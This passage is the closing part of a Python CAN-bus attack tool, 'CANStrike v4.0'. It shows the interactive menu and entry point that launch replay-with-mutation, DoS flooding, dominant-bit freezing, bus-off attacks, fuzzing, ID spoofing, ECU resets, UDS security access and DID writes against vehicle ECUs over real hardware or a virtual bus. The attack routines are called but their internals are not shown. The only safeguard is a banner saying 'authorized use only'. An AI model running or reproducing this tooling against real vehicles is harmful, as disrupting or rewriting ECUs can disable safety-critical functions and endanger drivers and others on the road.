                pr("DTCs: {}".format(dtcs or "none"), YELLOW)
            elif cmd == "sleep":
                time.sleep(float(step.get("seconds",1)))
            elif cmd == "export_html":
                Reporter.generate_html_report({
                    "title":          step.get("title","Auto Report"),
                    "tester":         step.get("tester","CANStrike Auto"),
                    "target":         step.get("target","Unknown"),
                    "date":           datetime.now().strftime("%Y-%m-%d"),
                    "backend":        self.engine.bus.label,
                    "frames":         self.captures,
                    "analyst_results":self.analyst.analyse(self.captures) if self.captures else [],
                    "attacks_run":    self.attacks_log,
                    "notes":          step.get("notes","Automated playbook run."),
                }, step.get("filename","canstrike_auto_report.html"))
            else:
                pr("Unknown cmd: {}".format(cmd), YELLOW)
        except Exception as e:
            pr("Step error ({}): {}".format(cmd, e), RED)
            log.error("Script step {}: {}".format(cmd,e))


# ═══════════════════════════════════════════════════════════════════════════════
#  INTERACTIVE MENU
# ═══════════════════════════════════════════════════════════════════════════════
class CANStrikeMenu:

    MENU = [
        # key, label, category
        ("1",  "Detect Baudrate",               "recon"),
        ("2",  "Capture Packets",               "recon"),
        ("3",  "Identify Responsible Packet",   "recon"),
        ("4",  "Live Bus Monitor",              "recon"),
        ("5",  "Baseline → Trigger Delta Diff", "recon"),
        ("6",  "AI Analysis — Think 4 Yourself","analyst"),
        ("7",  "Replay + Mutation",             "attack"),
        ("8",  "DoS Flooding",                  "attack"),
        ("9",  "Freeze DOM",                    "protocol"),
        ("10", "Bus-Off Attack",                "protocol"),
        ("11", "Smart Fuzzer",                  "attack"),
        ("12", "ID Spoofing",                   "attack"),
        ("13", "UDS / OBD-II Service Menu",     "uds"),
        ("14", "Run Playbook Script",           "script"),
        ("15", "Save Session",                  "utility"),
        ("16", "Load Session",                  "utility"),
        ("17", "Export Captures (CSV/JSON)",    "utility"),
        ("18", "Generate HTML Report",          "utility"),
        ("19", "Connect / Switch Device",       "utility"),
        ("20", "Start vcan0 ECU Simulator",     "simulator"),
        ("21", "Stop  vcan0 Simulator",         "simulator"),
        ("0",  "Exit",                          "utility"),
    ]
    CAT_COL = {"recon":CYAN,"analyst":MAG,"attack":RED,"protocol":ORG,
               "uds":BLUE,"script":YELLOW,"simulator":BLUE,"utility":DIM}
    CAT_HDR = {"recon":    "--- RECON & MONITOR ----",
               "analyst":  "--- AI ANALYSIS --------",
               "attack":   "--- ATTACKS ------------",
               "protocol": "--- PROTOCOL ATTACKS ---",
               "uds":      "--- UDS / OBD-II -------",
               "script":   "--- SCRIPTING ----------",
               "simulator":"--- SIMULATOR ----------",
               "utility":  "--- UTILITY ------------"}

    def __init__(self):
        self.bus: Optional[BusInterface]      = None
        self.engine: Optional[AttackEngine]   = None
        self.uds: Optional[UDSClient]         = None
        self.analyst   = Analyst()
        self.sim: Optional[VCanSimulator]     = None
        self.captures: List[Dict]             = []
        self.baseline: List[Dict]             = []
        self.attacks_log: List[Dict]          = []
        self.analyst_results: List[Dict]      = []
        self.delta_results: List[Dict]        = []
        self.uds_findings: List[Dict]         = []
        self.report_meta: Dict[str,Any]       = {}
        self.con = Console() if RICH else None

    # ── Banner ─────────────────────────────────────────────────────────────────
    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(c("""
  +==============================================================+
  |  CANSTRIKE v4.0  |  CANPico + vcan0  |  Kali Linux          |
  |  AI Analyst  |  Delta-Diff  |  UDS/OBD-II  |  HTML Report   |
  |  Live Monitor  |  Smart Fuzzer  |  Playbook Scripting        |
  |  !! FOR AUTHORIZED SECURITY RESEARCH ONLY !!                 |
  +==============================================================+
""", GREEN))

    # ── Device connection ──────────────────────────────────────────────────────
    def connect_device(self) -> bool:
        print(c("\n  Select backend:", CYAN))
        print("  [1]  CANPico   (USB / SLCAN — real hardware)")
        print("  [2]  vcan0     (SocketCAN  — virtual CAN)")
        print("  [3]  Other SocketCAN interface (can0, slcan0...)")
        ch = input(c("\n  Backend: ", YELLOW)).strip()
        if ch == "1":   return self._connect_canpico()
        elif ch == "2": return self._connect_vcan("vcan0")
        elif ch == "3":
            iface = input(c("  Interface: ", YELLOW)).strip() or "can0"
            return self._connect_vcan(iface)
        pr("Invalid", RED); return False

    def _connect_canpico(self) -> bool:
        if not HAS_SERIAL:
            pr("pip3 install pyserial", RED); return False
        ports = ([p.device for p in serial.tools.list_ports.comports()
                  if any(x in p.device for x in ("ttyACM","ttyUSB","COM"))]
                 or [p.device for p in serial.tools.list_ports.comports()])
        if not ports:
            pr("No serial ports found", RED)
            pr("Check: ls /dev/ttyACM*  or  dmesg | tail", DIM)
            return False
        print(c("\n  Ports:", CYAN))
        for i,p in enumerate(ports): print("  [{}] {}".format(i,p))
        print("  [m] manual")
        sel = input(c("  Select: ", YELLOW)).strip()
        port = (input(c("  Port: ", YELLOW)).strip() if sel=="m"
                else ports[int(sel)] if sel.isdigit() and int(sel)<len(ports)
                else ports[0])
        bmap = {"1":125000,"2":250000,"3":500000,"4":1000000}
        print(c("  Baudrate:", CYAN))
        for k,v in bmap.items(): print("  [{}] {}K".format(k,v//1000))
        baud = bmap.get(input(c("  [3=500K]: ", YELLOW)).strip(), 500000)
        self.bus = CANPicoBackend(port, baud)
        if not self.bus.connect():
            pr("Connect failed — check permissions", RED)
            pr("sudo usermod -aG dialout $USER && newgrp dialout", DIM); return False
        self.engine = AttackEngine(self.bus, self.con)
        self.uds    = UDSClient(self.bus)
        pr("CANPico: {}".format(self.bus.label), GREEN); return True

    def _connect_vcan(self, channel: str) -> bool:
        if not HAS_CAN:
            pr("pip3 install python-can", RED); return False
        r = subprocess.run(["ip","link","show",channel], capture_output=True)
        if r.returncode != 0 or b"UP" not in r.stdout:
            pr("Bringing up {}...".format(channel), YELLOW)
            VCanSimulator(channel).setup_vcan()
        self.bus = VCanBackend(channel)
        if not self.bus.connect():
            pr("Cannot open {} — setup vcan first:".format(channel), RED)
            pr("  sudo modprobe vcan", DIM)
            pr("  sudo ip link add dev {} type vcan".format(channel), DIM)
            pr("  sudo ip link set up {}".format(channel), DIM); return False
        self.engine = AttackEngine(self.bus, self.con)
        self.uds    = UDSClient(self.bus)
        pr("Connected: {}".format(self.bus.label), GREEN); return True

    # ── UDS sub-menu ──────────────────────────────────────────────────────────
    def uds_menu(self):
        if not self.uds: pr("No device connected", RED); return
        while True:
            print(c("\n  UDS / OBD-II  (req=0x{:03X} resp=0x{:03X})".format(
                self.uds.req_id, self.uds.resp_id), BLUE))
            print(c("  "+"-"*42, DIM))
            opts = [
                ("1","Change Request/Response IDs"),
                ("2","OBD-II — Scan supported PIDs"),
                ("3","OBD-II — Read PID"),
                ("4","OBD-II — Read DTCs"),
                ("5","UDS — Session Control"),
                ("6","UDS — ECU Reset"),
                ("7","UDS — Read DID"),
                ("8","UDS — Security Access (seed+key)"),
                ("9","UDS — Tester Present (keepalive)"),
                ("10","UDS — Scan DID range"),
                ("11","UDS — Write DID"),
                ("12","UDS — Routine Control"),
                ("0","Back"),
            ]
            for k,l in opts:
                print("  [{}] {}".format(c(k,BOLD), c(l,BLUE)))
            ch = input(c("\n  UDS> ", YELLOW)).strip()
            if ch == "0": break
            elif ch == "1":
                rq = input(c("  Request ID hex [7E0]: ", YELLOW)).strip() or "7E0"
                rp = input(c("  Response ID hex [7E8]: ", YELLOW)).strip() or "7E8"
                self.uds.req_id  = int(rq,16)
                self.uds.resp_id = int(rp,16)
                pr("IDs updated", GREEN)
            elif ch == "2":
                pids = self.uds.obd_scan_pids()
                pr("Supported PIDs: {}".format(
                   [hex(p) for p in pids] or "none"), GREEN)
            elif ch == "3":
                pid = input(c("  PID hex [0C=RPM]: ", YELLOW)).strip() or "0C"
                r   = self.uds.obd_read_pid(int(pid,16))
                if r["ok"]:
                    val = r.get("value","raw: "+r.get("data",b"").hex().upper())
                    pr("{}: {} {}".format(r.get("pid_name","PID"),val,r.get("unit","")), GREEN)
                    self.uds_findings.append({"service":"OBD SID01","detail":r.get("pid_name",""),
                                              "result":"{} {}".format(val,r.get("unit",""))})
                else:
                    pr("No response / NRC: {}".format(r.get("nrc_str","?")), RED)
            elif ch == "4":
                dtcs = self.uds.obd_read_dtcs()
                if dtcs:
                    pr("DTCs found: {}".format(dtcs), YELLOW)
                    self.uds_findings.append({"service":"OBD SID03","detail":"DTCs",
                                              "result":", ".join(dtcs)})
                else:
                    pr("No DTCs / no response", DIM)
            elif ch == "5":
                mode = input(c("  Session mode [3=extDiag]: ", YELLOW)).strip() or "3"
                r = self.uds.uds_session(int(mode,16)
                                         if "0x" in mode else int(mode))
                pr("Session: {}".format("OK" if r["ok"] else r.get("nrc_str","fail")),
                   GREEN if r["ok"] else RED)
                self.uds_findings.append({"service":"UDS 0x10","detail":"Session mode {}".format(mode),
                                          "result":"OK" if r["ok"] else r.get("nrc_str","fail")})
            elif ch == "6":
                rtype = input(c("  Reset type [1=hard,2=key off,3=soft]: ", YELLOW)).strip() or "1"
                r = self.uds.uds_ecu_reset(int(rtype))
                pr("ECU Reset: {}".format("OK" if r["ok"] else r.get("nrc_str","fail")),
                   GREEN if r["ok"] else RED)
                self.attacks_log.append({"name":"ECUReset","target":hex(self.uds.req_id),
                                         "result":"OK" if r["ok"] else "NRC","ts":ts()})
            elif ch == "7":
                did = input(c("  DID hex [F190=VIN]: ", YELLOW)).strip() or "F190"
                r   = self.uds.uds_read_did(int(did,16))
                if r["ok"]:
                    raw = r.get("data",b"").hex().upper()
                    pr("DID 0x{}: {}".format(did.upper(), raw), GREEN)
                    self.uds_findings.append({"service":"UDS 0x22","detail":"DID 0x{}".format(did.upper()),
                                              "result":raw})
                else:
                    pr("NRC: {}".format(r.get("nrc_str","?")), RED)
            elif ch == "8":
                pr("Attempting Security Access...", CYAN)
                ok, seed = self.uds.uds_security_access()
                if ok:
                    pr("Security Access GRANTED! seed=0x{:04X}".format(seed or 0), GREEN)
                    self.uds_findings.append({"service":"UDS 0x27","detail":"SecurityAccess",
                                              "result":"GRANTED (seed=0x{:04X})".format(seed or 0)})
                else:
                    pr("Security Access DENIED / no response", RED)
            elif ch == "9":
                r = self.uds.uds_tester_present()
                pr("TesterPresent: {}".format("OK" if r["ok"] else "no response"),
                   GREEN if r["ok"] else YELLOW)
            elif ch == "10":
                s = input(c("  Start DID hex [F180]: ", YELLOW)).strip() or "F180"
                e = input(c("  End DID hex   [F1FF]: ", YELLOW)).strip() or "F1FF"
                found = self.uds.scan_uds_dids(int(s,16), int(e,16))
                for f in found:
                    self.uds_findings.append({"service":"UDS DID Scan",
                                              "detail":"0x{:04X}".format(f["did"]),
                                              "result":f["data"].hex().upper()})
            elif ch == "11":
                did = input(c("  DID hex: ", YELLOW)).strip()
                val = input(c("  Value hex: ", YELLOW)).strip()
                if did and val:
                    r = self.uds.uds_write_did(int(did,16), bytes.fromhex(val))
                    pr("Write DID: {}".format("OK" if r["ok"] else r.get("nrc_str","fail")),
                       GREEN if r["ok"] else RED)
                    self.attacks_log.append({"name":"WriteDID","target":"0x{}".format(did.upper()),
                                             "result":"OK" if r["ok"] else "NRC","ts":ts()})
            elif ch == "12":
                rid = input(c("  Routine ID hex: ", YELLOW)).strip() or "FF00"
                sub = input(c("  SubFunction [1=start,2=stop,3=results]: ", YELLOW)).strip() or "1"
                r   = self.uds.uds_routine_control(int(rid,16), int(sub))
                pr("Routine 0x{}: {}".format(rid.upper(),
                   "OK" if r["ok"] else r.get("nrc_str","fail")),
                   GREEN if r["ok"] else RED)

    # ── Menu draw ──────────────────────────────────────────────────────────────
    def draw_menu(self):
        dev_s = c("● "+self.bus.label, GREEN) if self.bus else c("○ NO DEVICE", RED)
        sim_s = c("  [SIM]", BLUE) if self.sim else ""
        cap_s = c("  [{} frames]".format(len(self.captures)), YELLOW) if self.captures else ""
        bl_s  = c("  [baseline:{}]".format(len(self.baseline)), DIM) if self.baseline else ""
        print("\n  {}{}{}{}".format(dev_s,sim_s,cap_s,bl_s))
        hr()
        prev = None
        for key,label,cat in self.MENU:
            if cat != prev:
                print(c("\n  {}".format(self.CAT_HDR.get(cat,"")), self.CAT_COL.get(cat,DIM)))
                prev = cat
            print("  [{}]  {}".format(c(key,BOLD), c(label,self.CAT_COL.get(cat,DIM))))
        hr()

    def need_bus(self) -> bool:
        if not self.bus: pr("No device — use option 19", RED); return False
        return True

    def _log_attack(self, name: str, target: str, result: str):
        self.attacks_log.append({"name":name,"target":target,"result":result,"ts":ts()})

    # ── Main loop ──────────────────────────────────────────────────────────────
    def run(self):
        self.banner()
        print(c("  LEGAL DISCLAIMER — Authorized use only.", RED+BOLD))
        if input(c("  Type 'agree' to continue: ", YELLOW)).strip().lower() != "agree":
            sys.exit(0)
        if not HAS_CAN and not HAS_SERIAL:
            pr("No backends available — pip3 install pyserial python-can", RED); sys.exit(1)
        self.connect_device()

        while True:
            self.draw_menu()
            ch = input(c("\n  Select: ", BOLD+GREEN)).strip()

            # ── RECON ─────────────────────────────────────────────────────────
            if ch == "1":
                if self.need_bus(): self.engine.detect_baudrate()

            elif ch == "2":
                if self.need_bus():
                    d = input(c("  Duration (s) [5]: ", YELLOW)).strip()
                    self.captures = self.engine.capture_packets(float(d) if d else 5.0)
                    Reporter.print_table(self.captures, console=self.con)

            elif ch == "3":
                if self.need_bus():
                    action = input(c("  Action name: ", YELLOW)).strip() or "action"
                    d = input(c("  Capture window (s) [3]: ", YELLOW)).strip()
                    r = input(c("  Runs [3]: ", YELLOW)).strip()
                    cands = self.engine.identify_packet(
                        action, float(d) if d else 3.0, int(r) if r.isdigit() else 3)
                    if cands:
                        self.captures = [{"id":cd["id"],"dlc":8,
                                          "data":bytes.fromhex(cd["sample_data"]) if cd["sample_data"] else bytes(8),
                                          "ts":time.time(),"extended":False} for cd in cands]

            elif ch == "4":
                if self.need_bus():
                    LiveMonitor(self.bus).run()

            elif ch == "5":
                if self.need_bus():
                    print(c("\n  Step 1: Capture BASELINE (bus at rest)", CYAN))
                    d = input(c("  Baseline duration (s) [5]: ", YELLOW)).strip()
                    self.baseline = self.engine.capture_packets(float(d) if d else 5.0, "(baseline)")
                    input(c("\n  Step 2: NOW perform the action, then press ENTER...", BOLD+YELLOW))
                    d2 = input(c("  Triggered duration (s) [3]: ", YELLOW)).strip()
                    triggered = self.engine.capture_packets(float(d2) if d2 else 3.0, "(triggered)")
                    self.delta_results = Analyst.delta_diff(self.baseline, triggered)
                    self.analyst.print_delta(self.delta_results, self.con)
                    if self.delta_results:
                        self.captures = [{"id":d["id"],"dlc":8,
                                          "data":d["sample"] if d.get("sample") else bytes(8),
                                          "ts":time.time(),"extended":False}
                                         for d in self.delta_results]

            # ── ANALYST ───────────────────────────────────────────────────────
            elif ch == "6":
                if not self.captures: pr("No captures — run option 2 first", YELLOW)
                else:
                    self.analyst_results = self.analyst.analyse(self.captures)
                    self.analyst.print_report(self.analyst_results, self.con)

            # ── ATTACKS ───────────────────────────────────────────────────────
            elif ch == "7":
                if self.need_bus():
                    raw_id = input(c("  Packet ID hex: ", YELLOW)).strip()
                    raw_dt = input(c("  Data hex: ", YELLOW)).strip()
                    count  = input(c("  Count [20]: ", YELLOW)).strip()
                    delay  = input(c("  Delay ms [100]: ", YELLOW)).strip()
                    print(c("  Mutate: [n]one [b]itflip [s]tep [x]boundary", DIM))
                    mutmap = {"n":"none","b":"bitflip","s":"step","x":"boundary"}
                    mut = mutmap.get(input(c("  [n]: ", YELLOW)).strip().lower(), "none")
                    try:
                        self.engine.replay_attack(
                            int(raw_id,16), bytes.fromhex(raw_dt),
                            int(count) if count else 20,
                            float(delay) if delay else 100.0, mut)
                        self._log_attack("Replay+{}".format(mut), "0x"+raw_id, "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "8":
                if self.need_bus():
                    rate   = input(c("  fps [2000]: ", YELLOW)).strip()
                    dur    = input(c("  Duration (s) [10]: ", YELLOW)).strip()
                    raw_id = input(c("  Target ID hex (blank=random): ", YELLOW)).strip()
                    try:
                        tid = int(raw_id,16) if raw_id else None
                        self.engine.dos_attack(int(rate) if rate else 2000,
                                               float(dur) if dur else 10.0, tid)
                        self._log_attack("DoS", raw_id or "random", "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "9":
                if self.need_bus():
                    raw_id = input(c("  Target Node ID hex: ", YELLOW)).strip()
                    dur    = input(c("  Duration (s) [10]: ", YELLOW)).strip()
                    try:
                        self.engine.freeze_dom(int(raw_id,16), float(dur) if dur else 10.0)
                        self._log_attack("FreezDOM", "0x"+raw_id, "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "10":
                if self.need_bus():
                    raw_id = input(c("  Target Node ID hex: ", YELLOW)).strip()
                    cyc    = input(c("  Cycles [32]: ", YELLOW)).strip()
                    try:
                        self.engine.busoff_attack(int(raw_id,16), int(cyc) if cyc else 32)
                        self._log_attack("Bus-Off", "0x"+raw_id, "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "11":
                if self.need_bus():
                    lo  = input(c("  ID min hex [000]: ", YELLOW)).strip()
                    hi  = input(c("  ID max hex [7FF]: ", YELLOW)).strip()
                    dur = input(c("  Duration (s) [30]: ", YELLOW)).strip()
                    print(c("  Strategy: [r]andom [b]itflip [x]boundary [i]ncrement", DIM))
                    smap = {"r":"random","b":"bitflip","x":"boundary","i":"increment"}
                    strat = smap.get(input(c("  [r]: ", YELLOW)).strip().lower(), "random")
                    try:
                        self.engine.fuzzing_attack(
                            (int(lo,16) if lo else 0, int(hi,16) if hi else 0x7FF),
                            float(dur) if dur else 30.0, strat,
                            self.captures if strat != "random" else None)
                        self._log_attack("Fuzz/{}".format(strat),
                                         "0x{}-0x{}".format(lo or "000",hi or "7FF"), "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "12":
                if self.need_bus():
                    raw_id = input(c("  Spoof as ID hex: ", YELLOW)).strip()
                    raw_dt = input(c("  Payload hex: ", YELLOW)).strip()
                    count  = input(c("  Count [50]: ", YELLOW)).strip()
                    try:
                        self.engine.spoof_attack(int(raw_id,16), bytes.fromhex(raw_dt),
                                                  int(count) if count else 50)
                        self._log_attack("Spoof", "0x"+raw_id, "Executed")
                    except ValueError as e: pr("Bad input: {}".format(e), RED)

            elif ch == "13":
                self.uds_menu()

            elif ch == "14":
                path = input(c("  Playbook JSON path: ", YELLOW)).strip()
                if os.path.isfile(path):
                    script = ScriptEngine(self.engine, self.analyst, self.uds,
                                          self.captures, self.attacks_log, self.con)
                    self.captures = script.run_file(path)
                else:
                    pr("File not found: {}".format(path), RED)

            elif ch == "15":
                if not self.captures: pr("Nothing to save", YELLOW)
                else:
                    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    path  = "canstrike_{}.cansession".format(stamp)
                    meta  = {"backend": self.bus.label if self.bus else "?",
                             "attacks": len(self.attacks_log)}
                    SessionManager.save(self.captures, meta, path)

            elif ch == "16":
                sessions = SessionManager.list_sessions()
                if sessions:
                    print(c("  Available sessions:", CYAN))
                    for i,s in enumerate(sessions): print("  [{}] {}".format(i,s))
                    sel = input(c("  Select: ", YELLOW)).strip()
                    path = (sessions[int(sel)] if sel.isdigit() and int(sel)<len(sessions)
                            else input(c("  Path: ", YELLOW)).strip())
                else:
                    path = input(c("  Session file path: ", YELLOW)).strip()
                try:
                    self.captures, _ = SessionManager.load(path)
                    Reporter.print_table(self.captures, console=self.con)
                except Exception as e:
                    pr("Load failed: {}".format(e), RED)

            elif ch == "17":
                if not self.captures: pr("Nothing to export", YELLOW)
                else:
                    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    fmt   = input(c("  [c]sv/[j]son/[b]oth [c]: ", YELLOW)).strip().lower()
                    if fmt in ("","c","b"):
                        Reporter.export_csv(self.captures, "canstrike_{}.csv".format(stamp))
                    if fmt in ("j","b"):
                        Reporter.export_json(self.captures, "canstrike_{}.json".format(stamp))

            elif ch == "18":
                stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                title  = input(c("  Report title: ", YELLOW)).strip() or "CAN Bus Assessment"
                tester = input(c("  Tester name: ", YELLOW)).strip() or "CANStrike"
                target = input(c("  Target/vehicle: ", YELLOW)).strip() or "Unknown"
                notes  = input(c("  Notes (one line): ", YELLOW)).strip()
                fname  = "canstrike_report_{}.html".format(stamp)
                Reporter.generate_html_report({
                    "title":          title,
                    "tester":         tester,
                    "target":         target,
                    "date":           datetime.now().strftime("%Y-%m-%d"),
                    "backend":        self.bus.label if self.bus else "?",
                    "frames":         self.captures,
                    "analyst_results":self.analyst_results,
                    "delta_results":  self.delta_results,
                    "attacks_run":    self.attacks_log,
                    "uds_findings":   self.uds_findings,
                    "notes":          notes or "No notes.",
                }, fname)

            elif ch == "19":
                if self.bus: self.bus.disconnect(); self.bus=None; self.engine=None; self.uds=None
                self.connect_device()

            elif ch == "20":
                if not HAS_CAN: pr("pip3 install python-can", RED)
                elif self.sim:  pr("Sim already running — stop first (21)", YELLOW)
                else:
                    ch2 = input(c("  vcan channel [vcan0]: ", YELLOW)).strip() or "vcan0"
                    self.sim = VCanSimulator(ch2)
                    if not self.sim.start(): self.sim = None
                    else: pr("Connect to {} via option 19!".format(ch2), CYAN)

            elif ch == "21":
                if self.sim: self.sim.stop(); self.sim = None
                else: pr("Simulator not running", YELLOW)

            elif ch == "0":
                pr("Exiting...", DIM)
                if self.sim: self.sim.stop()
                if self.bus: self.bus.disconnect()
                sys.exit(0)
            else:
                pr("Invalid option", RED)

            input(c("\n  Press ENTER to continue...", DIM))
            self.banner()


# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def check_deps():
    pkgs = []
    if not HAS_SERIAL: pkgs.append("pyserial")
    if not HAS_CAN:    pkgs.append("python-can")
    if not RICH:       pkgs.append("rich")
    if pkgs:
        print(c("  Missing optional packages: {}".format(", ".join(pkgs)), YELLOW))
        print(c("  pip3 install {}".format(" ".join(pkgs)), DIM))
        print()

def parse_args():
    p = argparse.ArgumentParser(
        description="CANStrike v4.0 — CAN Bus Attack Utility",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
vcan0 setup (one-time):
  sudo modprobe vcan
  sudo ip link add dev vcan0 type vcan && sudo ip link set up vcan0

Examples:
  python3 canstrike.py                       # interactive menu
  python3 canstrike.py --simulate            # boot ECU sim + connect vcan0
  python3 canstrike.py --vcan vcan0          # connect vcan0 directly
  python3 canstrike.py --port /dev/ttyACM0   # connect CANPico
  python3 canstrike.py --playbook scan.json  # run automated playbook
""")
    p.add_argument("--port",      help="CANPico serial port")
    p.add_argument("--baudrate",  type=int, default=500000)
    p.add_argument("--vcan",      metavar="CH", help="SocketCAN channel (e.g. vcan0)")
    p.add_argument("--simulate",  action="store_true", help="Start ECU sim + connect vcan0")
    p.add_argument("--playbook",  metavar="FILE", help="Run JSON playbook then enter menu")
    p.add_argument("--list-ports",action="store_true")
    return p.parse_args()

if __name__ == "__main__":
    check_deps()
    args = parse_args()

    if args.list_ports:
        if HAS_SERIAL:
            for p in serial.tools.list_ports.comports():
                print("  {:<24} {}".format(p.device, p.description))
        else:
            print(c("pyserial not installed", RED))
        sys.exit(0)

    menu = CANStrikeMenu()

    if args.simulate:
        pr("Starting vcan0 ECU simulator...", BLUE)
        menu.sim = VCanSimulator("vcan0")
        menu.sim.start(); time.sleep(0.5)
        menu._connect_vcan("vcan0")
    elif args.vcan:
        menu._connect_vcan(args.vcan)
    elif args.port:
        menu.bus = CANPicoBackend(args.port, args.baudrate)
        if menu.bus.connect():
            menu.engine = AttackEngine(menu.bus, menu.con)
            menu.uds    = UDSClient(menu.bus)
            pr("CANPico: {}".format(args.port), GREEN)
        else:
            pr("Failed: {}".format(args.port), RED); sys.exit(1)

    if args.playbook:
        if menu.engine:
            script = ScriptEngine(menu.engine, menu.analyst, menu.uds,
                                  menu.captures, menu.attacks_log, menu.con)
            menu.captures = script.run_file(args.playbook)
        else:
            pr("Connect a device before running a playbook", RED)

    menu.run()
